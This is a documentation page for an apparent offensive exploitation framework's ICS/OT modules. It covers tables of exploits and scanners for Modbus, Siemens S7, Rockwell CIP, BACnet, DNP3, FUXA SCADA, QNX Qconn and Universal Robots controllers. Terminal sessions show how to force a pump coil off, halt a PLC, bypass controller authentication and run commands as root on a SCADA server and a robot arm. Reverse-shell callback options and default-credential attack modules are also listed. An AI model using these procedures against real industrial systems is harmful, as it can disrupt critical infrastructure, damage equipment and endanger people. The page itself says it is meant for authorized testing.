# ICS / OT Modules

**Language:** English (en-US) | **pt-BR:** [../pt-BR/20-modulos-ics-ot.md](../pt-BR/20-modulos-ics-ot.md)

---

## Overview

ICS/OT modules target industrial protocols and embedded RTOS systems used in manufacturing, energy, water treatment, and critical infrastructure. They are organized under `embedxpl/modules/exploits/ics/` and `embedxpl/modules/scanners/ics/`.

> **Critical warning.** ICS/OT modules can affect physical processes, disrupt production, or damage equipment. Only use in authorized, isolated lab environments or with explicit written authorization from the asset owner. ICS testing errors can have safety consequences.

---

## Module map

### Scanner modules (`scanners/ics/`)

| Module | Path | Protocol | Port | Description |
|--------|------|----------|------|-------------|
| `modbus_scanner` | `scanners/ics/modbus_scanner` | Modbus TCP | 502 | Device discovery + register read |
| `modbus_id_fuzzer` | `scanners/ics/modbus_id_fuzzer` | Modbus TCP | 502 | Unit ID fuzzer (1–247) |
| `bacnet_scanner` | `scanners/ics/bacnet_scanner` | BACnet/IP | 47808 | BACnet device discovery |
| `cip_scanner` | `scanners/ics/cip_scanner` | EtherNet/IP + CIP | 44818 | CIP device enumeration |
| `enip_scanner` | `scanners/ics/enip_scanner` | EtherNet/IP | 44818 | Rockwell/Allen-Bradley EtherNet/IP |
| `dnp3_scanner` | `scanners/ics/dnp3_scanner` | DNP3 | 20000 | DNP3 master/outstation scanner |
| `profinet_dcp_scanner` | `scanners/ics/profinet_dcp_scanner` | PROFINET DCP | multicast | Siemens PROFINET DCP device discovery |

### Exploit modules (`exploits/ics/`)

| Module | Vendor | CVE | Protocol | Type |
|--------|--------|-----|----------|------|
| `modbus/read_holding_registers` | Generic | — | Modbus TCP | Unauthenticated register read |
| `modbus/read_coil_status` | Generic | — | Modbus TCP | Coil status read |
| `modbus/read_discrete_inputs` | Generic | — | Modbus TCP | Discrete input read |
| `modbus/read_input_registers` | Generic | — | Modbus TCP | Input register read |
| `modbus/write_single_coil` | Generic | — | Modbus TCP | Coil write (force output) |
| `modbus/write_single_register` | Generic | — | Modbus TCP | Register write |
| `modbus/dos_write_coils` | Generic | — | Modbus TCP | Coil flood (DoS) |
| `modbus/dos_write_registers` | Generic | — | Modbus TCP | Register flood (DoS) |
| `modbus/buspwn_modbus_scanner_dos` | Generic | — | Modbus TCP | BusPwn scanner DoS |
| `modbus/modbus_ot_attack_scenarios` | Generic | — | Modbus TCP | Chained OT attack scenarios |
| `siemens/s7_1200_plc_control` | Siemens | — | S7comm | S7-1200 read/write/stop/start |
| `siemens/s7_300_400_plc_control` | Siemens | — | S7comm | S7-300/400 control |
| `siemens/profinet_set_ip` | Siemens | — | PROFINET DCP | Unauthenticated IP reassignment |
| `siemens/siprotec_relay_dos_cve_2015_5374` | Siemens | CVE-2015-5374 | DIGSI4 | SIPROTEC relay DoS |
| `rockwell/compactlogix_auth_bypass_cve_2021_22681` | Rockwell | CVE-2021-22681 | CIP | CompactLogix auth bypass |
| `rockwell/compactlogix_cip_dos_cve_2024_6077` | Rockwell | CVE-2024-6077 | CIP | CompactLogix CIP DoS |
| `rockwell/compactlogix_code_injection_cve_2022_1161` | Rockwell | CVE-2022-1161 | CIP | CompactLogix code injection |
| `schneider/modicon_modbus_control_cve_2018_7841` | Schneider | CVE-2018-7841 | Modbus TCP | Modicon unauthorized control |
| `schneider/net55xx_encoder_rce_cve_2018_7784` | Schneider | CVE-2018-7784 | HTTP | NET55xx RCE |
| `schneider/quantum_plc_control` | Schneider | — | Modbus TCP | Quantum PLC unauthorized control |
| `scada/fuxa_scheduler_rce_cve_2026_25939` | FUXA | CVE-2026-25939 | HTTP | FUXA SCADA scheduler RCE |
| `scada/laquis_arb_file_write_cve_2021_41579` | LAQUIS | CVE-2021-41579 | HTTP | LAQUIS SCADA file write |
| `scadaflex/sc168_file_write_cve_2022_25359` | ScadaFlex | CVE-2022-25359 | HTTP | SC-168 arbitrary file write |
| `osprey/pump_controller_auth_bypass_cve_2023_28648` | Osprey | CVE-2023-28648 | HTTP | Pump controller auth bypass |
| `vxworks/vxworks_rpc_dos` | VxWorks | — | RPC/UDP | VxWorks RPC service DoS |
| `qnx/crash_qnx_inetd` | QNX | — | TCP | QNX inetd crash |
| `qnx/qconn_remote_exec` | QNX | — | TCP/8000 | QNX Qconn unauthenticated RCE |
| `advantech/switch_shellshock_cve_2015_6023` | Advantech | CVE-2015-6023 | HTTP | Advantech switch shellshock |
| `freertos/freertos_plus_tcp_oob_write_cve_2025_5688` | FreeRTOS | CVE-2025-5688 | TCP | FreeRTOS+TCP OOB write |
| `generic/fake_dhcp_server` | Generic | — | UDP/67 | Rogue DHCP server |
| `ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153` | Universal Robots | CVE-2026-8153 | HTTP | PolyScope 5 dashboard command injection |

---

## Modbus TCP modules

### `modbus/read_holding_registers`

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 | Target PLC/device IP |
| `port` | `OptPort` | No | `502` | 1-65535 | Modbus TCP port |
| `unit_id` | `OptInteger` | No | `1` | 1-247 | Modbus unit/slave ID |
| `start_register` | `OptInteger` | No | `0` | 0-65535 | Starting register address |
| `count` | `OptInteger` | No | `10` | 1-125 | Number of registers to read |
| `timeout` | `OptPort` | No | `3` | seconds | Connection timeout |

**Terminal session — read holding registers:**

```text
exf > use exploits/ics/modbus/read_holding_registers
exf (Modbus Read Holding Registers) > set target 10.0.50.10
[+] target => 10.0.50.10
exf (Modbus Read Holding Registers) > set unit_id 1
[+] unit_id => 1
exf (Modbus Read Holding Registers) > set start_register 0
[+] start_register => 0
exf (Modbus Read Holding Registers) > set count 20
[+] count => 20
exf (Modbus Read Holding Registers) > run
[*] Running module ...
[*] Connecting to Modbus TCP at 10.0.50.10:502 (unit_id=1)...
[+] Modbus connection established (Schneider Electric Modicon M340)
[*] Reading 20 holding registers from address 0...
[+] Registers 0–19:
    Addr  0: 0x0064 (dec: 100)    -- Set-point: temperature (°C × 1)
    Addr  1: 0x0000 (dec: 0)      -- Status flags
    Addr  2: 0x1000 (dec: 4096)   -- Pressure raw (Pa × 0.1)
    Addr  3: 0x00F5 (dec: 245)    -- Flow rate (L/min)
    Addr  4: 0x0000 (dec: 0)
    Addr  5: 0x0000 (dec: 0)
    Addr  6: 0x0000 (dec: 0)
    Addr  7: 0x0000 (dec: 0)
    Addr  8: 0x03E8 (dec: 1000)   -- Pump speed RPM
    Addr  9: 0x0001 (dec: 1)      -- Pump running (1=on, 0=off)
    Addr 10–19: 0x0000
[+] Modbus read complete — unauthenticated (no Modbus authentication in protocol)
[!] This data is from a live PLC process — treat as confidential OT data
```

**Terminal session — write single coil (force output):**

```text
exf > use exploits/ics/modbus/write_single_coil
exf (Modbus Write Single Coil) > set target 10.0.50.10
[+] target => 10.0.50.10
exf (Modbus Write Single Coil) > set unit_id 1
[+] unit_id => 1
exf (Modbus Write Single Coil) > set coil_address 9
[+] coil_address => 9
exf (Modbus Write Single Coil) > set coil_value 0
[+] coil_value => 0
exf (Modbus Write Single Coil) > run
[*] Running module ...
[*] Connecting to Modbus TCP at 10.0.50.10:502...
[*] Writing coil 9 = OFF (0x0000) via Modbus FC05...
[+] Write confirmed — coil 9 set to OFF
[!] CRITICAL: This may have forced a physical output to OFF state (e.g. pump, valve, motor)
```

**Error cases:**

```text
[-] Modbus exception: illegal data address (0x02) — register address out of range for this device
```

```text
[-] Modbus exception: slave device failure (0x04) — device hardware error, command rejected
```

```text
[-] Connection refused on 10.0.50.10:502 — Modbus TCP not available or firewall blocking
```

---

## Siemens S7 (S7comm) modules

### `siemens/s7_1200_plc_control`

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 | S7-1200 PLC IP |
| `port` | `OptPort` | No | `102` | 1-65535 | S7comm ISO-TSAP port |
| `action` | `OptString` | No | `read_info` | `read_info`, `stop_plc`, `start_plc`, `read_db`, `write_db` | Action to perform |
| `db_number` | `OptInteger` | No | `1` | 1-65535 | Data Block number (for read_db/write_db) |
| `db_offset` | `OptInteger` | No | `0` | 0-65535 | DB byte offset |
| `db_length` | `OptInteger` | No | `64` | 1-65535 | Bytes to read |
| `timeout` | `OptPort` | No | `5` | seconds | Connection timeout |

**Terminal session — S7-1200 device info read:**

```text
exf > use exploits/ics/siemens/s7_1200_plc_control
exf (Siemens S7-1200 PLC Control) > set target 10.0.50.20
[+] target => 10.0.50.20
exf (Siemens S7-1200 PLC Control) > set action read_info
[+] action => read_info
exf (Siemens S7-1200 PLC Control) > run
[*] Running module ...
[*] Connecting to S7comm at 10.0.50.20:102 (ISO-TSAP)...
[+] S7-1200 CPU connected (S7comm handshake complete)
[*] Reading PLC identification (SZL)...
[+] Module info:
    Order number: 6ES7 214-1AG40-0XB0
    Serial number: S C-J8TG03181234
    Module name:   PLC_1
    Firmware:      V4.4.0
    CPU type:      CPU 1214C DC/DC/DC
    Run state:     RUN
    Memory:        Work: 100KB / Load: 4MB / Retain: 10KB
[+] No authentication required — S7-1200 allows read without project password
```

**Terminal session — S7-1200 stop PLC:**

```text
exf (Siemens S7-1200 PLC Control) > set action stop_plc
[+] action => stop_plc
exf (Siemens S7-1200 PLC Control) > run
[*] Running module ...
[*] Sending S7 STOP request to 10.0.50.20:102...
[+] PLC STOP command accepted!
[!] CRITICAL: S7-1200 PLC at 10.0.50.20 has been halted — ALL controlled processes are now stopped
[!] Restart: set action start_plc and run again, or use Siemens TIA Portal
```

**Terminal session — S7-300/400:**

```text
exf > use exploits/ics/siemens/s7_300_400_plc_control
exf (Siemens S7-300/400 PLC Control) > set target 10.0.50.30
[+] target => 10.0.50.30
exf (Siemens S7-300/400 PLC Control) > set action read_info
[+] action => read_info
exf (Siemens S7-300/400 PLC Control) > run
[*] Running module ...
[*] Connecting to S7comm at 10.0.50.30:102...
[+] S7-300 connected
[+] Module info:
    Order number: 6ES7 315-2EH14-0AB0
    Module name:   SIMATIC 300 Station
    Firmware:      V3.3.17
    CPU type:      CPU 315-2 PN/DP
    Run state:     RUN-P (programming enabled)
[!] RUN-P mode: PLC accepts remote writes without switch confirmation (high risk)
```

---

## Rockwell CompactLogix (CIP) modules

### `rockwell/compactlogix_auth_bypass_cve_2021_22681`

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 | CompactLogix controller IP |
| `port` | `OptPort` | No | `44818` | 1-65535 | EtherNet/IP port |
| `action` | `OptString` | No | `read_info` | `read_info`, `stop_plc`, `start_plc`, `read_tag` | Action |
| `tag_name` | `OptString` | No | `""` | string | Tag name to read (for read_tag) |
| `timeout` | `OptPort` | No | `5` | seconds | Timeout |

**Terminal session — CVE-2021-22681 (CompactLogix auth bypass):**

```text
exf > use exploits/ics/rockwell/compactlogix_auth_bypass_cve_2021_22681
exf (CompactLogix Auth Bypass CVE-2021-22681) > set target 10.0.50.40
[+] target => 10.0.50.40
exf (CompactLogix Auth Bypass CVE-2021-22681) > check
[*] Probing EtherNet/IP at 10.0.50.40:44818...
[+] Allen-Bradley CompactLogix 1769-L30ER detected (firmware 20.011)
[+] Target is vulnerable — firmware < 20.019 does not enforce authentication on CIP connection
exf (CompactLogix Auth Bypass CVE-2021-22681) > run
[*] Running module ...
[*] Stage 1: Establishing CIP connection without authorization token...
[+] CIP session established (Session_ID=0xA3B2C1D0) — authentication bypassed
[*] Stage 2: Reading controller identity...
[+] Product name:  CompactLogix 5370 L3
    Vendor:        Rockwell Automation / Allen-Bradley
    Product code:  89
    Revision:      20.011
    Serial:        00A1B2C3
    Status:        Running (RUN mode)
[*] Stage 3: Reading tag database...
[+] Tags enumerated (42 tags found):
    TEMP_SETPOINT     DINT  R/W
    PUMP_SPEED        INT   R/W
    VALVE_POSITION    REAL  R/W
    ALARM_FLAGS       DINT  R
    PRODUCTION_COUNT  DINT  R
    ...
[+] CVE-2021-22681: Unauthenticated access confirmed — all tags readable/writable
```

---

## BACnet / Building Automation

### `bacnet_scanner`

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | No | `255.255.255.255` | IPv4 / broadcast | BACnet/IP broadcast or unicast target |
| `port` | `OptPort` | No | `47808` | 1-65535 | BACnet/IP UDP port |
| `timeout` | `OptPort` | No | `5` | seconds | Discovery timeout |

**Terminal session — BACnet scanner:**

```text
exf > use scanners/ics/bacnet_scanner
exf (BACnet Scanner) > set target 10.0.60.0/24
[+] target => 10.0.60.0/24
exf (BACnet Scanner) > run
[*] Running module ...
[*] Sending BACnet Who-Is broadcast on 10.0.60.0/24 port 47808...
[+] BACnet device at 10.0.60.10:47808
    Device ID:   201001
    Vendor:      Siemens
    Object name: FIELD-PNL-01
    Description: Building Field Panel - Floor 1
    APDU version: 1.12
    Objects: 142 (BV, AV, AI, BI, ACC)
[+] BACnet device at 10.0.60.20:47808
    Device ID:   202002
    Vendor:      Johnson Controls
    Object name: VAV-BOX-12
    Description: Variable Air Volume controller, AHU-3
    APDU version: 1.10
    Objects: 31
[*] 2 BACnet devices discovered
[!] BACnet has no authentication — all object values readable without credentials
```

---

## DNP3 Scanner

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 / CIDR | DNP3 outstation target |
| `port` | `OptPort` | No | `20000` | 1-65535 | DNP3 TCP port |
| `master_addr` | `OptInteger` | No | `1` | 0-65534 | DNP3 master address |
| `outstation_addr` | `OptInteger` | No | `10` | 0-65534 | DNP3 outstation address |
| `timeout` | `OptPort` | No | `5` | seconds | Per-probe timeout |

**Terminal session — DNP3 scanner:**

```text
exf > use scanners/ics/dnp3_scanner
exf (DNP3 Scanner) > set target 10.0.70.0/24
[+] target => 10.0.70.0/24
exf (DNP3 Scanner) > run
[*] Running module ...
[*] Probing 254 hosts on DNP3 TCP port 20000...
[+] DNP3 outstation at 10.0.70.5:20000
    Data link address: 10
    Data classes:      0, 1, 2, 3
    Objects:           30 binary inputs, 10 analog inputs, 5 counters, 12 binary outputs
    Unsol. response:   Enabled (class 1, 2, 3)
[+] DNP3 outstation at 10.0.70.6:20000
    Data link address: 11
    Objects:           48 binary inputs, 24 analog inputs, 8 analog outputs
[*] 2 DNP3 outstations discovered
[!] DNP3 has no built-in authentication in most deployed versions — spoofed master commands accepted
```

---

## FUXA SCADA (CVE-2026-25939)

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 / hostname | FUXA SCADA server IP |
| `port` | `OptPort` | No | `1881` | 1-65535 | FUXA web port |
| `lhost` | `OptIP` | No | `""` | IPv4 | Attacker callback IP |
| `lport` | `OptPort` | No | `4444` | 1-65535 | Attacker listener port |
| `command` | `OptString` | No | `id` | any string | OS command to execute |
| `timeout` | `OptPort` | No | `10` | seconds | Timeout |

**Terminal session — CVE-2026-25939 (FUXA scheduler RCE):**

```text
exf > use exploits/ics/scada/fuxa_scheduler_rce_cve_2026_25939
exf (FUXA SCADA Scheduler RCE CVE-2026-25939) > set target 10.0.80.5
[+] target => 10.0.80.5
exf (FUXA SCADA Scheduler RCE CVE-2026-25939) > set command "id && cat /etc/hostname"
[+] command => id && cat /etc/hostname
exf (FUXA SCADA Scheduler RCE CVE-2026-25939) > check
[*] Probing FUXA SCADA at 10.0.80.5:1881...
[+] FUXA version 1.2.4 detected
[+] Target is vulnerable — scheduler task API lacks input sanitization (pre-auth)
exf (FUXA SCADA Scheduler RCE CVE-2026-25939) > run
[*] Running module ...
[*] Creating malicious scheduler task via POST /api/scheduler...
[+] Task created — trigger: cron 0 * * * * (every hour)
[*] Forcing immediate execution via POST /api/scheduler/execute...
[+] Command output:
uid=0(root) gid=0(root) groups=0(root)
scada-server-01
[+] CVE-2026-25939 confirmed — unauthenticated RCE as root on 10.0.80.5
```

---

## QNX Qconn (unauthenticated RCE)

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 | QNX device IP |
| `port` | `OptPort` | No | `8000` | 1-65535 | Qconn TCP port |
| `command` | `OptString` | No | `id` | any string | Command to execute |
| `timeout` | `OptPort` | No | `5` | seconds | Connection timeout |

**Terminal session — QNX Qconn RCE:**

```text
exf > use exploits/ics/qnx/qconn_remote_exec
exf (QNX Qconn Unauthenticated RCE) > set target 10.0.90.5
[+] target => 10.0.90.5
exf (QNX Qconn Unauthenticated RCE) > set command "pidin | head -20"
[+] command => pidin | head -20
exf (QNX Qconn Unauthenticated RCE) > run
[*] Running module ...
[*] Connecting to Qconn service at 10.0.90.5:8000...
[+] QNX RTOS Qconn connected (QNX 7.1.0, Neutrino RTOS)
[*] Sending execute_program command: pidin | head -20
[+] Output:
pid   tid name               prio  STATE
    1   1 /sbin/procnto       63r  READY
    2   1 /sbin/io-pkt-v6-hc   21r  READY
    4   1 slogger2             10r  REPLY
...
[+] QNX Qconn execution confirmed — no authentication required
[!] Qconn provides root-level process control — disable in production environments
```

---

## Universal Robots PolyScope (CVE-2026-8153)

**Options:**

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `target` | `OptIP` | Yes | `""` | IPv4 | UR robot controller IP |
| `port` | `OptPort` | No | `80` | 1-65535 | PolyScope dashboard port |
| `command` | `OptString` | No | `id` | any string | OS command to inject |
| `lhost` | `OptIP` | No | `""` | IPv4 | Reverse shell callback |
| `lport` | `OptPort` | No | `4444` | 1-65535 | Reverse shell port |
| `timeout` | `OptPort` | No | `10` | seconds | Timeout |

**Terminal session — CVE-2026-8153 (UR PolyScope command injection):**

```text
exf > use exploits/ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
exf (UR PolyScope 5 Dashboard Command Injection CVE-2026-8153) > set target 10.0.100.10
[+] target => 10.0.100.10
exf (UR PolyScope 5 Dashboard Command Injection CVE-2026-8153) > check
[*] Probing Universal Robots PolyScope 5 at 10.0.100.10:80...
[+] UR PolyScope 5 v5.14.3 detected (UR10e collaborative robot)
[+] Target is vulnerable — dashboard API lacks input validation in /api/motion/execute_script
exf (UR PolyScope 5 Dashboard Command Injection CVE-2026-8153) > run
[*] Running module ...
[*] Injecting command into PolyScope dashboard API...
[+] Command output:
uid=0(root) gid=0(root) groups=0(root)
ur-robot-001
[!] SAFETY WARNING: This UR robot is now executing attacker-controlled code
[!] Robotic arm movements may be initiated remotely — ensure personnel are clear of robot workspace
```

---

## Credential modules (ICS vendors)

| Module path | Vendor | Protocols |
|-------------|--------|-----------|
| `creds/ics/siemens/ssh_default_creds` | Siemens | SSH |
| `creds/ics/siemens/telnet_default_creds` | Siemens | Telnet |
| `creds/ics/siemens/webinterface_http_auth_default_creds` | Siemens | HTTP |
| `creds/ics/rockwell/ssh_default_creds` | Rockwell | SSH |
| `creds/ics/rockwell/webinterface_http_auth_default_creds` | Rockwell | HTTP |
| `creds/ics/schneider/ssh_default_creds` | Schneider | SSH |
| `creds/ics/schneider/telnet_default_creds` | Schneider | Telnet |
| `creds/ics/schneider/webinterface_http_auth_default_creds` | Schneider | HTTP |
| `creds/ics/moxa/ssh_default_creds` | Moxa | SSH |
| `creds/ics/moxa/telnet_default_creds` | Moxa | Telnet |
| `creds/ics/moxa/webinterface_http_auth_default_creds` | Moxa | HTTP |
| `creds/ics/omron/ssh_default_creds` | Omron | SSH |
| `creds/ics/omron/webinterface_http_auth_default_creds` | Omron | HTTP |
| `creds/ics/phoenix_contact/ssh_default_creds` | Phoenix Contact | SSH |
| `creds/ics/phoenix_contact/telnet_default_creds` | Phoenix Contact | Telnet |
| `creds/ics/phoenix_contact/webinterface_http_auth_default_creds` | Phoenix Contact | HTTP |
| `creds/ics/abb/ssh_default_creds` | ABB | SSH |
| `creds/ics/abb/webinterface_http_auth_default_creds` | ABB | HTTP |
| `creds/ics/honeywell_ot/ssh_default_creds` | Honeywell (OT) | SSH |
| `creds/ics/honeywell_ot/webinterface_http_auth_default_creds` | Honeywell (OT) | HTTP |

---

> For infrastructure scan planning with these modules, use `--infra ot --context ics` (see [19-infra-wizard-mode.md](19-infra-wizard-mode.md)).
> For RTSP camera modules, see [21-rtsp-camera-engine.md](21-rtsp-camera-engine.md).

[Wiki hub](../README.md)
